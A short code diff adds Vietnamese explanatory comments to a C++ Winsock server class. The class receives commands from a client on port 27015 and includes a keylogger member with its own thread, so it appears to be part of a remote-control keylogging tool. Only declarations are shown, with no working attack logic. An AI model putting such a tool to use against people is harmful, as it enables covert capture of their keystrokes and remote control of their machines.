@@ -17,15 +17,17 @@
 class Server
 {
 public:
-    std::string port;
-    WSADATA wsaData;
-    SOCKET listenSock = INVALID_SOCKET;
-    SOCKET clientSock = INVALID_SOCKET;
-    char command[BUFSIZ];
-    struct addrinfo hints{}, *res = nullptr;
+    std::string port; //Port kết nối của Server
+    WSADATA wsaData; // Cấu trúc dữ liệu của Winsock API
+    SOCKET listenSock = INVALID_SOCKET; //Socket lắng nghe kết nối
+    SOCKET clientSock = INVALID_SOCKET; //Socket giao tiếp với Client
+    char command[BUFSIZ]; //Mảng lưu lệnh nhận từ Client
+    struct addrinfo hints{}, *res = nullptr; 
+    // hints sử cung để lưu thông tin Socket
+    // res dùng để trỏ tới dang sách kết quả địa chỉ sau khi gọi hàm getaddrinfo()
 
-    const char *PORT = "27015";
-    const int BUFSIZE = 512;
+    const char *PORT = "27015"; //Port mặc định của chương trình
+    const int BUFSIZE = 512; //Độ dài tối đa của command
 
     keylogger keylog;
     std::thread keyLogThread;
